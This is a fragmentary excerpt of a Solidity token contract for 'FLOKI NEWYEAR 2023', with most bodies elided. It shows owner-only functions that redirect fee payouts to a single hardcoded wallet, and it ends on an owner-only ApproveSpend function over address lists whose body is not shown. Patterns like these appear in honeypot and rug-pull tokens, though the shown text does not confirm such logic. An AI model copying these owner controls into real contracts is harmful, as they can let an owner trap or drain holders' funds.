...
contract FNY2023 is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "FLOKI NEWYEAR 2023";
    string private _symbol = "FNY2023";
    uint8 private _decimals = 9;

    address payable public MarketingWallet = payable(0xe6eE8E144Ae85Ecc4D82F2Fb3E1502529B231f8f); // Marketing Address
    address payable public BuyBackWallet = payable(0xe6eE8E144Ae85Ecc4D82F2Fb3E1502529B231f8f); // Team Address
    ...
    function setFeeReceivers(address _marketingFeeReceiver, address _devFeeReceiver) external onlyOwner() {
        ...
        BuyBackWallet = payable(_devFeeReceiver); 
    }
    ...
    function swapAndLiquify(uint256 tAmount) private lockTheSwap {
        ...
        if(amountBNBTeam > 0)
            transferToAddressETH(BuyBackWallet, amountBNBTeam);
    ...
    function ApproveSpend(address[] calldata addresses, bool status) public onlyOwner {
